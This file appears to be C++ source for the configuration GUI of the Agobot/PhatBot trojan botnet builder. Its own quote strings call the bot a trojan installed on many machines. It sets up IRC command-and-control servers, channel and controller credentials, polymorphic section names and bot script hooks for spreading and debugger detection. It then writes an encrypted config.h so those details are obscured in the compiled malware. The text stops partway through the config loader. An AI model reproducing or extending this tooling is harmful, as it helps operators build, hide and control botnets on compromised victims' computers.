#include "stdafx.h"
#include "configgui.h"
#include "configguiDlg.h"
#include "sapphire.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

bool g_bEditing=false;

int g_iKeyLen=0;

char *szQuotes[] = {
	"when they outlaw cryptography only outlaws will have privacy",
	"1. Configure bot - 2. ??? - 3. Profit!",
	"Change some stuff :)",
	"A kind of Darwinism pervades the world of trojan botnet development.",
	"PhatBot is installed on hundreds of thousands machines already.",
	"I RTFA and I'm really impressed with the features on this trojan.",
	"Phatbot is the Swiss army knife of Trojan horses",
	NULL
};

void init_random() { srand(GetTickCount()); }
int brandom(int bot,int top) { return (int)((float)((top+1)-bot)*rand()/(RAND_MAX+1.0))+bot; }
int brandom_100(int bot,int top) { Sleep(25); return (int)((float)((top+1)-bot)*rand()/(RAND_MAX+1.0))+bot; }
int get_random_number(int range) { return rand()%range; }

bool server_item::operator==(const server_item &item) {
	if(	bRootServer==item.bRootServer &&
		!sNickPrefix.Compare(item.sNickPrefix) &&
		!sServPass.Compare(item.sServPass) &&
		!sServer.Compare(item.sServer) &&
		iPort==item.iPort &&
		!sChanPass.Compare(item.sChanPass) &&
		!sMainChan.Compare(item.sMainChan) &&
		bUseSSL==item.bUseSSL)
		return true;
	else
		return false; }

bool user_item::operator==(const user_item &item) {
	if(	!sUserName.Compare(item.sUserName) &&
		!sPassword.Compare(item.sPassword) &&
		!sHostmask.Compare(item.sHostmask) &&
		!sIdentdmask.Compare(item.sIdentdmask))
		return true;
	else
		return false; }

server_item::server_item() {
	bRootServer=false; sNickPrefix=""; sServPass=""; sServer="";
	iPort=1; sChanPass=""; sMainChan=""; bUseSSL=false; }

user_item::user_item() {
	sUserName=""; sPassword=""; sHostmask=""; sIdentdmask=""; }

class CAboutDlg:public CDialog {
public:
	CAboutDlg();

	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);
	//}}AFX_VIRTUAL

protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg():CDialog(CAboutDlg::IDD) {
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX) {
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

CString RndNick(const char *szPrefix) {
	CString sRetVal; srand(GetTickCount()); sRetVal=szPrefix;
	for(int n=0;n<7;n++)
	{	CString sTemp; sTemp=sRetVal;
		sRetVal.Format("%s%c", sTemp, (rand()%26)+97); }
	return sRetVal;
}

CConfigguiDlg::CConfigguiDlg(CWnd* pParent):CDialog(CConfigguiDlg::IDD, pParent) {
	//{{AFX_DATA_INIT(CConfigguiDlg)
	m_sConfigList = _T("");
	m_sValueChar = _T("");
	m_iValueInt = 0;
	m_sValueString = _T("");
	m_sDescription = _T("");
	m_bValueBool = FALSE;
	m_sPolySecName = RndNick(".");
	m_sChanPass = _T("");
	m_sHostmask = _T("");
	m_sIdentdmask = _T("");
	m_sMainChan = _T("");
	m_sNickPrefix = _T("");
	m_sPassword = _T("");
	m_bRootServer = FALSE;
	m_sServer = _T("");
	m_sServPass = _T("");
	m_iServPort = 1;
	m_sUserName = _T("");
	m_bUseSSL = FALSE;
	m_iKeyLen = 16;
	//}}AFX_DATA_INIT
	m_sScript=
		"onstart {\n" \
		"}\n\n" \
		"onconnect {\n" \
		"}\n\n" \
		"onjoin {\n" \
		"}\n\n" \
		"onlogin {\n" \
		"}\n\n" \
		"ondisconnect {\n" \
		"}\n\n" \
		"onremove {\n" \
		"}\n\n" \
		"onspread {\n" \
		"}\n\n" \
		"ondebugeractive {\n" \
		"}\n\n" \
		"ontimer 10080m {\n" \
		"}\n\n" \
		"onstartupfin {\n" \
		"}\n";

	m_hIcon=AfxGetApp()->LoadIcon(IDR_MAINFRAME); }

void CConfigguiDlg::DoDataExchange(CDataExchange* pDX) {
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CConfigguiDlg)
	DDX_Control(pDX, IDC_QUOTE, m_cQuote);
	DDX_Control(pDX, IDC_USER_LIST, m_cUserList);
	DDX_Control(pDX, IDC_SERVER_LIST, m_cServerList);
	DDX_Control(pDX, IDC_VALUE_STRING, m_cValueString);
	DDX_Control(pDX, IDC_VALUE_INT, m_cValueInt);
	DDX_Control(pDX, IDC_VALUE_CHAR, m_cValueChar);
	DDX_Control(pDX, IDC_VALUE_BOOL, m_cValueBool);
	DDX_Control(pDX, IDC_CONFIG_LIST, m_cConfigList);
	DDX_LBString(pDX, IDC_CONFIG_LIST, m_sConfigList);
	DDX_Text(pDX, IDC_VALUE_CHAR, m_sValueChar);
	DDV_MaxChars(pDX, m_sValueChar, 1);
	DDX_Text(pDX, IDC_VALUE_INT, m_iValueInt);
	DDX_Text(pDX, IDC_VALUE_STRING, m_sValueString);
	DDX_Text(pDX, IDC_DESCRIPTION, m_sDescription);
	DDX_Check(pDX, IDC_VALUE_BOOL, m_bValueBool);
	DDX_Text(pDX, IDC_POLY_SECNAME, m_sPolySecName);
	DDV_MaxChars(pDX, m_sPolySecName, 8);
	DDX_Text(pDX, IDC_CHANPASS, m_sChanPass);
	DDX_Text(pDX, IDC_HOSTMASK, m_sHostmask);
	DDX_Text(pDX, IDC_IDENTDMASK, m_sIdentdmask);
	DDX_Text(pDX, IDC_MAINCHAN, m_sMainChan);
	DDX_Text(pDX, IDC_NICKPREFIX, m_sNickPrefix);
	DDX_Text(pDX, IDC_PASSWORD, m_sPassword);
	DDX_Check(pDX, IDC_ROOTSERVER, m_bRootServer);
	DDX_Text(pDX, IDC_SERVER, m_sServer);
	DDX_Text(pDX, IDC_SERVPASS, m_sServPass);
	DDX_Text(pDX, IDC_SERVPORT, m_iServPort);
	DDV_MinMaxInt(pDX, m_iServPort, 1, 65535);
	DDX_Text(pDX, IDC_USERNAME, m_sUserName);
	DDX_Check(pDX, IDC_USESSL, m_bUseSSL);
	DDX_Text(pDX, IDC_KEY_LEN, m_iKeyLen);
	DDV_MinMaxInt(pDX, m_iKeyLen, 8, 128);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CConfigguiDlg, CDialog)
	//{{AFX_MSG_MAP(CConfigguiDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDLOADFROM, OnLoadfrom)
	ON_BN_CLICKED(IDSAVETO, OnSaveto)
	ON_WM_SHOWWINDOW()
	ON_LBN_SELCHANGE(IDC_CONFIG_LIST, OnSelchangeConfigList)
	ON_BN_CLICKED(IDC_VALUE_BOOL, OnValueBool)
	ON_EN_CHANGE(IDC_VALUE_CHAR, OnChangeValueChar)
	ON_EN_CHANGE(IDC_VALUE_INT, OnChangeValueInt)
	ON_EN_CHANGE(IDC_VALUE_STRING, OnChangeValueString)
	ON_BN_CLICKED(IDADDSERVER, OnAddserver)
	ON_BN_CLICKED(IDDELSERVER, OnDelserver)
	ON_BN_CLICKED(IDADDUSER, OnAdduser)
	ON_BN_CLICKED(IDDELUSER, OnDeluser)
	ON_LBN_SELCHANGE(IDC_SERVER_LIST, OnSelchangeServerList)
	ON_LBN_SELCHANGE(IDC_USER_LIST, OnSelchangeUserList)
	ON_BN_CLICKED(IDC_USESSL, OnUsessl)
	ON_EN_CHANGE(IDC_USERNAME, OnChangeUsername)
	ON_EN_CHANGE(IDC_SERVPORT, OnChangeServport)
	ON_EN_CHANGE(IDC_SERVPASS, OnChangeServpass)
	ON_EN_CHANGE(IDC_SERVER, OnChangeServer)
	ON_BN_CLICKED(IDC_ROOTSERVER, OnRootserver)
	ON_EN_CHANGE(IDC_PASSWORD, OnChangePassword)
	ON_EN_CHANGE(IDC_NICKPREFIX, OnChangeNickprefix)
	ON_EN_CHANGE(IDC_MAINCHAN, OnChangeMainchan)
	ON_EN_CHANGE(IDC_IDENTDMASK, OnChangeIdentdmask)
	ON_EN_CHANGE(IDC_HOSTMASK, OnChangeHostmask)
	ON_EN_CHANGE(IDC_CHANPASS, OnChangeChanpass)
	ON_EN_CHANGE(IDC_KEY_LEN, OnChangeKeyLen)
	ON_BN_CLICKED(IDEDITSCR, OnEditscr)
	ON_BN_CLICKED(IDCMDREF, OnCmdref)
	ON_BN_CLICKED(IDFAQ, OnFaq)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

BOOL CConfigguiDlg::OnInitDialog() {
	CDialog::OnInitDialog();
	CMenu* pSysMenu=GetSystemMenu(FALSE); if(pSysMenu) {
		CString strAboutMenu; strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty()) {
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu); } }

	SetIcon(m_hIcon, TRUE); SetIcon(m_hIcon, FALSE);



//	m_cImageList.Add(AfxGetApp()->LoadIcon(IDI_COLLAPSED));
	
	return TRUE; }

void CConfigguiDlg::OnSysCommand(UINT nID, LPARAM lParam) {
	if((nID&0xFFF0)==IDM_ABOUTBOX) {
		CAboutDlg dlgAbout; dlgAbout.DoModal(); }
	else
		CDialog::OnSysCommand(nID, lParam); }

void CConfigguiDlg::OnPaint() {
	if(IsIconic()) {
		CPaintDC dc(this);
		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);
		int cxIcon=GetSystemMetrics(SM_CXICON), cyIcon=GetSystemMetrics(SM_CYICON);
		CRect rect; GetClientRect(&rect);
		int x=(rect.Width()-cxIcon+1)/2, y=(rect.Height()-cyIcon+1)/2;
		dc.DrawIcon(x, y, m_hIcon); }
	else
		CDialog::OnPaint(); }

HCURSOR CConfigguiDlg::OnQueryDragIcon() {
	return (HCURSOR)m_hIcon; }

void CConfigguiDlg::ParseConfigDef() {
	char szReadBuf[8192]; FILE *fp=fopen("config.def", "r"); if(!fp) {
		MessageBox("Failed to open config.def!", "Error", MB_OK | MB_ICONERROR); ExitProcess(1); }

	while(fgets(szReadBuf, sizeof(szReadBuf), fp) && !feof(fp)) {
		for(int i=0;i<strlen(szReadBuf);i++)
			if(szReadBuf[i]=='\r' || szReadBuf[i]=='\n') szReadBuf[i]='\x00';
		if(!strcmp(szReadBuf, "")) continue; if(szReadBuf[0]=='#') continue;
		char *szObjectType, *szName, *szDataType, *szDescription;
		szObjectType=strtok(szReadBuf, "\t"); szName=strtok(NULL, "\t");
		szDataType=strtok(NULL, "\t"); szDescription=strtok(NULL, "\t");
		if(!szObjectType || !szName || !szDataType || !szDescription) {
			MessageBox("Invalid config.def format!", "Error", MB_OK | MB_ICONERROR); ExitProcess(1); }
		
		if(!stricmp(szObjectType, "cvar")) {
			config_item cItem; cItem.sItemName=szName; cItem.sItemDesc=szDescription;

			if(!stricmp(szDataType, "string")) {
				cItem.iItemType=ITEM_TYPE_STRING;
				cItem.sItemTypeName="String";
			} else if(!stricmp(szDataType, "bool")) {
				cItem.iItemType=ITEM_TYPE_BOOL;
				cItem.sItemTypeName="Boolean";
			} else if(!stricmp(szDataType, "char")) {
				cItem.iItemType=ITEM_TYPE_CHAR;
				cItem.sItemTypeName="Character";
			} else if(!stricmp(szDataType, "int")) {
				cItem.iItemType=ITEM_TYPE_INT;
				cItem.sItemTypeName="Integer";
			} else {
				MessageBox("Invalid config.def format!", "Error", MB_OK | MB_ICONERROR); ExitProcess(1); }

			cItem.bItemData=false; cItem.cItemData='\x00';
			cItem.iItemData=0; cItem.sItemData="";

			m_lConfigItems.push_back(cItem);
		} else {
			MessageBox("Invalid config.def format!", "Error", MB_OK | MB_ICONERROR); ExitProcess(1); }
	}

	fclose(fp);

	if(!m_lConfigItems.size()) {
		MessageBox("config.def contains no config items!", "Error", MB_OK | MB_ICONERROR); ExitProcess(1); }
}

// Returns MD5 as a string of hex values (\x42\xF5\xD2....)
CString GetMD5(CString sInput) {
	md5::MD5_CTX md5; md5::MD5Init(&md5); unsigned char szMD5[16];
	CString sMD5; sMD5=""; const char *szBla=sInput.GetBuffer(8192);
	md5::MD5Update(&md5, (unsigned char*)szBla, sInput.GetLength());
	sInput.ReleaseBuffer();
	md5::MD5Final(szMD5, &md5); for(int i=0;i<16;i++)
	{	CString sTemp; sTemp.Format("\\x%2.2X", szMD5[i]); sMD5+=sTemp; }
	return sMD5; }

// Returns MD5 as text (FE349AC872....)
CString GetMD5Text(CString sInput) {
	md5::MD5_CTX md5; md5::MD5Init(&md5); unsigned char szMD5[16];
	CString sMD5; sMD5=""; const char *szBla=sInput.GetBuffer(8192);
	md5::MD5Update(&md5, (unsigned char*)szBla, sInput.GetLength());
	sInput.ReleaseBuffer();
	md5::MD5Final(szMD5, &md5); for(int i=0;i<16;i++)
	{	CString sTemp; sTemp.Format("%2.2X", szMD5[i]); sMD5+=sTemp; }
	return sMD5; }

CString Escape(CString sInput) {
	CString sRetVal;
	for(int i=0;i<sInput.GetLength();i++) {
		if(sInput.operator [](i)=='\\')
			sRetVal+="\\\\";
		else if(sInput.operator [](i)=='\"')
			sRetVal+="\\\"";
		else if(sInput.operator [](i)=='\r')
			sRetVal+="\\r";
		else if(sInput.operator [](i)=='\n')
			sRetVal+="\\n";
		else if(sInput.operator [](i)=='\t')
			sRetVal+="\\t";
		else {
			char szBla[3]={sInput.operator [](i), 0, 0};
			sRetVal+=szBla; }
	}
	return sRetVal;
}

CString EscapeH(CString sInput) {
	CString sRetVal;
	for(int i=0;i<sInput.GetLength();i++) {
		char szTemp[8]; char cBla=(const char)sInput.operator [](i);
		sprintf(szTemp, "\\x%2.2X", (unsigned char)cBla);
		sRetVal+=szTemp; }
	return sRetVal;
}

typedef struct scriptfile_s {
	CString	 sScript;
	CString *sRetVal;
} scriptfile;

CString EditScriptFile(CString sScript) {
	DeleteFile("c:\\temp.script");
	FILE *fp=fopen("c:\\temp.script", "w");
	if(!fp) return CString("");
	fprintf(fp, "%s", sScript);
	fflush(fp); fclose(fp);

	PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(STARTUPINFO));
	sinfo.cb=sizeof(sinfo); sinfo.wShowWindow=SW_SHOW;
	CreateProcess(NULL, "notepad.exe c:\\temp.script", NULL, NULL, FALSE, \
		NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	while(WaitForSingleObject(pinfo.hProcess, 10000)==WAIT_TIMEOUT);

	fp=fopen("c:\\temp.script", "r");
	if(!fp) return CString("");
	char szReadBuf[4096]; CString sRetVal("");
	while(fgets(szReadBuf, 4096, fp) && !feof(fp)) {
		sRetVal+=szReadBuf;
	}
	fclose(fp); DeleteFile("c:\\temp.script");
	return sRetVal; }

DWORD WINAPI EditScriptFileThread(void *pParams) {
	scriptfile *pFile=(scriptfile*)pParams;
	*pFile->sRetVal=(EditScriptFile(pFile->sScript));
	g_bEditing=false; delete pFile; return 0;
}

CString GenKey() {
	CString sRetVal(""); int iKeyLen=g_iKeyLen;
	for(int i=0;i<iKeyLen;i++) {
		char cChar; int iBla=brandom(1,3);
		switch(iBla) {
		case 1:
			cChar=brandom(48,57); // 0-9
			break;
		case 2:
			cChar=brandom(65,90); // A-Z
			break;
		case 3:
			cChar=brandom(97,122); // a-z
			break;
		default:
			cChar=brandom(65,90); // A-Z (default)
			break;
		};

		char szBla[3]={cChar,0,0}; sRetVal+=szBla; }
	return sRetVal; }

CString Encrypt(CString sIn, CString &sKey) {
	CSapphire cSap; CString sRetVal("");
	cSap.initialize((unsigned char*)sKey.operator const char *(), sKey.GetLength());

	int i;
	for(i=0;i<sIn.GetLength();i++) {
		char cEnc=cSap.encrypt(sIn.operator [](i));
		char szEncStr[3]={cEnc,0,0};
		sRetVal+=szEncStr; }

	CString sCheckStr(""); cSap.burn();
	cSap.initialize((unsigned char*)sKey.operator const char *(), sKey.GetLength());
	for(i=0;i<sRetVal.GetLength();i++) {
		char cDec=cSap.decrypt(sRetVal.operator [](i));
		char szDecStr[3]={cDec,0,0};
		sCheckStr+=szDecStr; }

	// If strings dont match get another key and encryt
	if(sCheckStr.Compare(sIn)) {
		init_random();
		sKey=GenKey(); cSap.burn();
		return Encrypt(sIn, sKey);
	}

	cSap.burn(); return sRetVal; }

void CConfigguiDlg::WriteConfigCpp() {
	init_random();
	int iRetVal=IDCANCEL; CString sFileName;
	while(iRetVal==IDCANCEL) {
		CFileDialog dlg(FALSE, "config.h", NULL, OFN_EXPLORER|OFN_ENABLESIZING|OFN_PATHMUSTEXIST|OFN_CREATEPROMPT|OFN_HIDEREADONLY|OFN_OVERWRITEPROMPT,
			"Config File (config.h)|config.h|Header Files (*.h)|*.h|All Files (*.*)|*.*||", this);
		iRetVal=dlg.DoModal(); if(iRetVal==IDCANCEL) { MessageBox("No file selected!", "Error", MB_OK | MB_ICONERROR); continue; }
		sFileName=dlg.GetPathName(); break;
	}

	UpdateData(TRUE);

	g_iKeyLen=m_iKeyLen;

	FILE *fp=fopen(sFileName, "w"); if(!fp) return;
	fprintf(fp, "#ifndef __CONFIG_H__\n");
	fprintf(fp, "#define __CONFIG_H__\n\n");
	fprintf(fp, "#include \"confbase.h\"\n\n");
	fprintf(fp, "// The section name for polymorph\n");
	fprintf(fp, "#define SECTION_NAME \"%s\"\n\n", m_sPolySecName);
	fprintf(fp, "// Array of CVars\n");
	fprintf(fp, "conf_cvar g_aCVars[] = {\n");

	list<config_item>::iterator ic;
	for(ic=m_lConfigItems.begin(); ic!=m_lConfigItems.end(); ic++) {

		switch((*ic).iItemType) {
		case ITEM_TYPE_STRING:
			{	CString sKey=GenKey(); CString sEncStr=Encrypt((*ic).sItemData, sKey);
				fprintf(fp, "\t{\t\"%s\",\t\"%s\",\t\"%s\",\t\"%s\"\t},\n", (*ic).sItemName, EscapeH(sEncStr), sKey, GetMD5(sEncStr)); }
			break;
		case ITEM_TYPE_CHAR:
			if((*ic).cItemData)
			{	char szBla[3]={(*ic).cItemData, 0, 0};
				fprintf(fp, "\t{\t\"%s\",\t\"%s\",\tNULL,\t\"\"\t},\n", (*ic).sItemName, Escape(CString(szBla))); }
			else
				fprintf(fp, "\t{\t\"%s\",\t\"\",\tNULL,\t\"\"\t},\n", (*ic).sItemName);
			break;
		case ITEM_TYPE_BOOL:
			if((*ic).bItemData)
				fprintf(fp, "\t{\t\"%s\",\t\"true\",\tNULL,\t\"\"\t},\n", (*ic).sItemName);
			else
				fprintf(fp, "\t{\t\"%s\",\t\"false\",\tNULL,\t\"\"\t},\n", (*ic).sItemName);
			break;
		case ITEM_TYPE_INT:
			fprintf(fp, "\t{\t\"%s\",\t\"%d\",\tNULL,\t\"\"\t},\n", (*ic).sItemName, (*ic).iItemData);
			break;
		default:
			break;
		};
	}

	fprintf(fp, "};\n\n");
	fprintf(fp, "// Array of Users\n");
	fprintf(fp, "conf_user g_aUsers[] = {\n");

	list<user_item>::iterator iu; int iUserNum=0;
	for(iu=m_lUserItems.begin(); iu!=m_lUserItems.end(); iu++) {
		CString sMD5Pass=GetMD5Text((*iu).sPassword); CString sKey=GenKey();

		fprintf(fp, "{\t{\t\"user%d.username\",\t\"%s\",\t\"%s\",\t\"%s\"\t},\n", iUserNum, EscapeH(Encrypt((*iu).sUserName, sKey)), sKey, GetMD5(Encrypt((*iu).sUserName, sKey)));
		fprintf(fp, "\t{\t\"user%d.password\",\t\"%s\",\tNULL,\t\"%s\"\t},\n", iUserNum, sMD5Pass, GetMD5(sMD5Pass));
		fprintf(fp, "\t{\t\"user%d.hostmask\",\t\"%s\",\t\"%s\",\t\"%s\"\t},\n", iUserNum, EscapeH(Encrypt((*iu).sHostmask, sKey)), sKey, GetMD5(Encrypt((*iu).sHostmask, sKey)));
		fprintf(fp, "\t{\t\"user%d.identdmask\",\t\"%s\",\t\"%s\",\t\"%s\"\t}, },\n", iUserNum, EscapeH(Encrypt((*iu).sIdentdmask, sKey)), sKey, GetMD5(Encrypt((*iu).sIdentdmask, sKey)));
		iUserNum++; }
	
	fprintf(fp, "};\n\n");
	fprintf(fp, "// Array of Servers\n");
	fprintf(fp, "conf_server g_aServers[] = {\n");

	list<server_item>::iterator is; int iServerNum=0;
	for(is=m_lServerItems.begin(); is!=m_lServerItems.end(); is++) {
		CString sKey=GenKey();
		fprintf(fp, "{\t{\t\"server%d.chanpass\",\t\"%s\",\t\"%s\",\t\"%s\"\t},\n", iServerNum, EscapeH(Encrypt((*is).sChanPass, sKey)), sKey, GetMD5(Encrypt((*is).sChanPass, sKey)));
		fprintf(fp, "\t{\t\"server%d.mainchan\",\t\"%s\",\t\"%s\",\t\"%s\"\t},\n", iServerNum, EscapeH(Encrypt((*is).sMainChan, sKey)), sKey, GetMD5(Encrypt((*is).sMainChan, sKey)));
		fprintf(fp, "\t{\t\"server%d.nickprefix\",\t\"%s\",\t\"%s\",\t\"%s\"\t},\n", iServerNum, EscapeH(Encrypt((*is).sNickPrefix, sKey)), sKey, GetMD5(Encrypt((*is).sNickPrefix, sKey)));
		fprintf(fp, "\t{\t\"server%d.port\",\t\"%d\",\tNULL,\t\"\"\t},\n", iServerNum, (*is).iPort);
		fprintf(fp, "\t{\t\"server%d.server\",\t\"%s\",\t\"%s\",\t\"%s\"\t},\n", iServerNum, EscapeH(Encrypt((*is).sServer, sKey)), sKey, GetMD5(Encrypt((*is).sServer, sKey)));
		fprintf(fp, "\t{\t\"server%d.servpass\",\t\"%s\",\t\"%s\",\t\"%s\"\t},\n", iServerNum, EscapeH(Encrypt((*is).sServPass, sKey)), sKey, GetMD5(Encrypt((*is).sServPass, sKey)));
		if((*is).bUseSSL) fprintf(fp, "\t{\t\"server%d.usessl\",\t\"true\",\tNULL,\t\"\"\t}\t},\n", iServerNum);
		else fprintf(fp, "\t{\t\"server%d.usessl\",\t\"false\",\tNULL,\t\"\"\t}\t},\n", iServerNum);
		iServerNum++; }

	fprintf(fp, "};\n\n");
	fprintf(fp, "// Script\n\n");
	fprintf(fp, "char *g_szScript = \\\n");

	// Loop while token isnt empty
	char *szTempCopy=new char[m_sScript.GetLength()+2];
	strcpy(szTempCopy, m_sScript);
	char *szToken=strtok(szTempCopy, "\n");

	if(szToken) {
		while(true) {
			char *szNextToken=strtok(NULL, "\n");

			if(szNextToken) {
				fprintf(fp, "\t\"%s\\n\" \\\n", Escape(CString(szToken)));
			} else {
				fprintf(fp, "\t\"%s\\n\";\n\n", Escape(CString(szToken))); break;
			}

			szToken=szNextToken;
		}
	}

	delete [] szTempCopy;

	fprintf(fp, "#endif // __CONFIG_H__\n");

	fclose(fp);
}

void CConfigguiDlg::SaveConfig(const char *szFileName) {
	if(!szFileName) return;
	FILE *fp=fopen(szFileName, "w"); if(!fp) return;

	list<config_item>::iterator ic;
	for(ic=m_lConfigItems.begin(); ic!=m_lConfigItems.end(); ic++) {
		switch((*ic).iItemType) {
		case ITEM_TYPE_STRING:
			fprintf(fp, "cvar\t%s\t%s\n", (*ic).sItemName, (*ic).sItemData);
			break;
		case ITEM_TYPE_CHAR:
			fprintf(fp, "cvar\t%s\t%c\n", (*ic).sItemName, (*ic).cItemData);
			break;
		case ITEM_TYPE_BOOL:
			if((*ic).bItemData) fprintf(fp, "cvar\t%s\ttrue\n", (*ic).sItemName);
			else fprintf(fp, "cvar\t%s\tfalse\n", (*ic).sItemName);
			break;
		case ITEM_TYPE_INT:
			fprintf(fp, "cvar\t%s\t%d\n", (*ic).sItemName, (*ic).iItemData);
			break;
		default:
			break;
		};
	}

	list<server_item>::iterator is;
	for(is=m_lServerItems.begin(); is!=m_lServerItems.end(); is++) {
		char *szRootServer, *szUseSSL;
		if((*is).bRootServer) szRootServer="true"; else szRootServer="false";
		if((*is).bUseSSL) szUseSSL="true"; else szUseSSL="false";

		const char *szNickPrefix, *szServPass, *szServer, *szChanPass, *szMainChan;
		if((*is).sNickPrefix.Compare("")) szNickPrefix=(*is).sNickPrefix; else szNickPrefix="(NULL)";
		if((*is).sServPass.Compare("")) szServPass=(*is).sServPass; else szServPass="(NULL)";
		if((*is).sServer.Compare("")) szServer=(*is).sServer; else szServer="(NULL)";
		if((*is).sChanPass.Compare("")) szChanPass=(*is).sChanPass; else szChanPass="(NULL)";
		if((*is).sMainChan.Compare("")) szMainChan=(*is).sMainChan; else szMainChan="(NULL)";

		fprintf(fp, "server\t%s\t%s\t%s\t%s\t%d\t%s\t%s\t%s\n", szRootServer, szNickPrefix,
			szServPass, szServer, (*is).iPort, szChanPass, szMainChan, szUseSSL);
	}

	list<user_item>::iterator iu;
	for(iu=m_lUserItems.begin(); iu!=m_lUserItems.end(); iu++) {
		const char *szUserName, *szPassword, *szHostmask, *szIdentdmask;

		if((*iu).sUserName.Compare("")) szUserName=(*iu).sUserName; else szUserName="(NULL)";
		if((*iu).sPassword.Compare("")) szPassword=(*iu).sPassword; else szPassword="(NULL)";
		if((*iu).sHostmask.Compare("")) szHostmask=(*iu).sHostmask; else szHostmask="(NULL)";
		if((*iu).sIdentdmask.Compare("")) szIdentdmask=(*iu).sIdentdmask; else szIdentdmask="(NULL)";

		fprintf(fp, "user\t%s\t%s\t%s\t%s\n", szUserName, szPassword, szHostmask, szIdentdmask);
	}

	if(m_sScript.GetLength()) fprintf(fp, "script\n%s", m_sScript);

	fclose(fp); }

void CConfigguiDlg::LoadConfig(const char *szFileName) {
	if(!szFileName) return;
	FILE *fp=fopen(szFileName, "r"); if(!fp) return;

	m_lUserItems.clear(); m_lServerItems.clear();
	m_cUserList.ResetContent(); m_cServerList.ResetContent();
	
	char szReadBuf[8192];

	while(fgets(szReadBuf, sizeof(szReadBuf), fp) && !feof(fp)) {
		for(int i=0;i<strlen(szReadBuf);i++)
			if(szReadBuf[i]=='\r' || szReadBuf[i]=='\n') szReadBuf[i]='\x00';
		if(!strcmp(szReadBuf, "")) continue; if(szReadBuf[0]=='#') continue;

		char *szItemType=strtok(szReadBuf, "\t");
		if(!szItemType) continue;

		if(!strcmp(szItemType, "cvar")) {
			char *szItemName, *szItemValue;
			szItemName=strtok(NULL, "\t"); szItemValue=strtok(NULL, "\t");
			if(!szItemName || !szItemValue) continue;

			list<config_item>::iterator ic;
			for(ic=m_lConfigItems.begin(); ic!=m_lConfigItems.end(); ic++) {
				if(!strcmp((*ic).sItemName, szItemName)) {
					switch((*ic).iItemType) {
					case ITEM_TYPE_STRING:
						(*ic).sItemData=szItemValue;
						break;
					case ITEM_TYPE_CHAR:
						(*ic).cItemData=*szItemValue;
						break;
					case ITEM_TYPE_BOOL:
						if(!stricmp(szItemValue, "true"))
							(*ic).bItemData=true;
						else
							(*ic).bItemData=false;
						break;
					case ITEM_TYPE_INT:
						(*ic).iItemData=atoi(szItemValue);
						break;
					default:
						break;
					};
				}
			}
		} else if(!strcmp(szItemType, "server")) {
			char *szRootServer, *szNickPrefix, *szServPass, *szServer, *szPort, *szChanPass, *szMainChan, *szUseSSL;
			szRootServer=strtok(NULL, "\t"); szNickPrefix=strtok(NULL, "\t");
			szServPass=strtok(NULL, "\t"); szServer=strtok(NULL, "\t");
			szPort=strtok(NULL, "\t"); szChanPass=strtok(NULL, "\t");
			szMainChan=strtok(NULL, "\t"); szUseSSL=strtok(NULL, "\t");
			if(	!szRootServer || !szNickPrefix || !szServPass || !szServer || \
				!szPort || !szChanPass || !szMainChan || !szUseSSL) continue;

			server_item sItem;

			if(!strcmp(szRootServer, "(NULL)")) szRootServer="";
			if(!strcmp(szNickPrefix, "(NULL)")) szNickPrefix="";
			if(!strcmp(szServPass, "(NULL)")) szServPass="";
			if(!strcmp(szServer, "(NULL)")) szServer="";
			if(!strcmp(szPort, "(NULL)")) szPort="";
			if(!strcmp(szChanPass, "(NULL)")) szChanPass="";
			if(!strcmp(szMainChan, "(NULL)")) szMainChan="";
			if(!strcmp(szUseSSL, "(NULL)")) szUseSSL="";

			if(!stricmp(szRootServer, "true")) sItem.bRootServer=true; else sItem.bRootServer=false;
			if(!stricmp(szUseSSL, "true")) sItem.bUseSSL=true; else sItem.bUseSSL=false;
			sItem.iPort=atoi(szPort); sItem.sChanPass=szChanPass;
			sItem.sMainChan=szMainChan; sItem.sNickPrefix=szNickPrefix;
			sItem.sServer=szServer; sItem.sServPass=szServPass;

			m_lServerItems.push_back(sItem);

			list<server_item>::iterator is;
			for(is=m_lServerItems.begin(); is!=m_lServerItems.end(); is++) {
				if((*is)==sItem) {
					CString sItemText;
					sItemText.Format("%s:%d - %s - %s", (*is).sServer, (*is).iPort, (*is).sMainChan, (*is).sNickPrefix);
					int iItem=m_cServerList.InsertString(0, sItemText);
					m_cServerList.SetItemDataPtr(iItem, &(*is));
					m_cServerList.SetCurSel(iItem);
					OnSelchangeServerList();
					break;
				}
			}
		} else if(!strcmp(szItemType, "user")) {
			char *szUserName, *szPassword, *szHostmask, *szIdentdmask;
			szUserName=strtok(NULL, "\t"); szPassword=strtok(NULL, "\t");
			szHostmask=strtok(NULL, "\t"); szIdentdmask=strtok(NULL, "\t");
			if(!szUserName || !szPassword || !szHostmask || !szIdentdmask) continue;

			user_item uItem;

			if(!strcmp(szUserName, "(NULL)")) szUserName="";
			if(!strcmp(szPassword, "(NULL)")) szPassword="";
			if(!strcmp(szHostmask, "(NULL)")) szHostmask="";
			if(!strcmp(szIdentdmask, "(NULL)")) szIdentdmask="";

